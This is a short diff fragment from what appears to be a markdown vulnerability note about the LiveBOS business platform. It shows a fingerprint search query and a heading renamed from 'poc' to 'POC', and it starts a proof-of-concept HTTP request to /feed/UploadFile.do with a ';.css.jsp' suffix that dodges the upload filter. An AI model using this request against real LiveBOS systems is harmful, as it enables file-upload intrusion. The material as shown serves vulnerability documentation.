@@ -8,7 +8,7 @@ LiveBOS灵动业务架构平台（简称LiveBOS）是顶点软件股份有限公
 app="LiveBOS-框架"
 ```
 
-## poc
+## POC
 
 ```yaml
 POST /feed/UploadFile.do;.css.jsp HTTP/1.1
